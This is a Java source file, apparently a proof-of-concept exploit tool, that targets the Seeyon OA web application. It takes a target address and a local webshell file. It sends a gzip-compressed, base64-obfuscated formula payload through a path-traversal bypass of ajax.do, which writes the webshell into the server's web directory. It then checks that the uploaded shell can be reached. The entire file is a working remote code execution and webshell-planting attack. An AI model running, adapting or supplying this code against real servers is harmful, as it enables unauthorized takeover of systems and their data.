import java.io.*;
import java.net.*;
import java.util.Base64;
import java.util.zip.GZIPOutputStream;
public class Main {
    public static void main(String[] args) throws UnsupportedEncodingException{
        String en_shell = "W3snZm9ybXVsYVR5cGUnOiAxLCAnZm9ybXVsYU5hbWUnOiAndGVzdCcsICdmb3JtdWxhRXhwcmVzc2lvbic6ICdTdHJpbmcgcGF0aCA9ICIuLi93ZWJhcHBzL3NlZXlvbi8iOwogICAgICAgCWphdmEuaW8uUHJpbnRXcml0ZXIgcHJpbnRXcml0ZXIyID0gbmV3IGphdmEuaW8uUHJpbnRXcml0ZXIocGF0aCsiZmlsZW5hbWUiKTsKICAgICAgICBTdHJpbmcgc2hlbGwgPSAic2hlbGxjb2RlIjsKICAgICAgICBzdW4ubWlzYy5CQVNFNjREZWNvZGVyIGRlY29kZXIgPSBuZXcgc3VuLm1pc2MuQkFTRTY0RGVjb2RlcigpOwogICAgICAgIFN0cmluZyBkZWNvZGVTdHJpbmcgPSBuZXcgU3RyaW5nKGRlY29kZXIuZGVjb2RlQnVmZmVyKHNoZWxsKSwiVVRGLTgiKTsKICAgICAgICBwcmludFdyaXRlcjIucHJpbnRsbihkZWNvZGVTdHJpbmcpOwogICAgICAgIHByaW50V3JpdGVyMi5jbG9zZSgpO307dGVzdCgpO2RlZiBzdGF0aWMgeHh4KCl7J30sICcnLCB7fSwgJ3RydWUnXQ==";
        String action = "";
        String filename = "";
        if (args.length == 2) {
            action = args[0];
            filename = args[1];
        } else {
            System.out.println("java -jar xxx.jar 127.0.0.1:8080 filename");
            System.out.println("by xiaosima");
            System.exit(0);
        }
        String webshell = Base64.getEncoder().encodeToString(Util.getText(filename).getBytes());
        String base_shell = new String(Base64.getDecoder().decode(en_shell));
        base_shell = base_shell.replace("filename", filename);
        base_shell = base_shell.replace("shellcode", webshell);
//        System.out.println("base_shell:"+base_shell);

        byte[] zip = Main.compress1(base_shell.getBytes(), "UTF-8");
        String zipstring = new String(zip, "ISO-8859-1");
        String out2 = URLEncoder.encode(new String(zipstring.getBytes("UTF-8")));
//        System.out.println("out2:"+out2);
        int res_code=Main.sendPost(action+"/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip","managerMethod=validate&arguments="+out2);
        int res_code2=Main.sendPost(action+"/seeyon/"+filename,"");
        if (res_code ==500 && res_code2==200){
            System.out.println("上传成功,存在漏洞,请尽快修复！！！");
            System.out.println("请访问："+action+"/seeyon/"+filename);
        }else{
            System.out.println("测试失败");
            System.out.println("请手动访问:"+action+"/seeyon/"+filename);
        }
    	
    }
    
    public static byte[] compress1(byte[] str, String encoding) {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPOutputStream gzip;
        try {
            gzip = new GZIPOutputStream(out);
            gzip.write(str);
            gzip.close();
        } catch (IOException e) {
            System.out.println(e.getMessage());
        }
        return out.toByteArray();
    }
    public static int sendPost(String url, String param){
        PrintWriter out = null;
        BufferedReader in = null;
        InputStream inputStream;
        int statusCode=0;
        try {
            URL realUrl = new URL(url);
            URLConnection conn = realUrl.openConnection();
            conn.setRequestProperty("accept", "*/*");
            conn.setRequestProperty("connection", "Keep-Alive");
            conn.setRequestProperty("user-agent",
                    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");
            if (param.isEmpty()){
                conn.setDoOutput(true);
            }else{
                conn.setDoOutput(true);
                conn.setDoInput(true);
            }
            out = new PrintWriter(conn.getOutputStream());
            out.print(param);
            out.flush();
            if (conn instanceof HttpURLConnection) {
                HttpURLConnection httpConn = (HttpURLConnection) conn;
                statusCode = httpConn.getResponseCode();
//                System.out.println(statusCode);
                if (statusCode != 200 /* or statusCode >= 200 && statusCode < 300 */) {
                    inputStream = httpConn.getErrorStream();
                }
            }

        } catch (Exception e) {
            System.out.println("发送 POST 请求出现异常！" + e);
        }
        finally {
            try {
                if (out != null) {
                    out.close();
                }
                if (in != null) {
                    in.close();
                }
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
        return statusCode;
    }

}
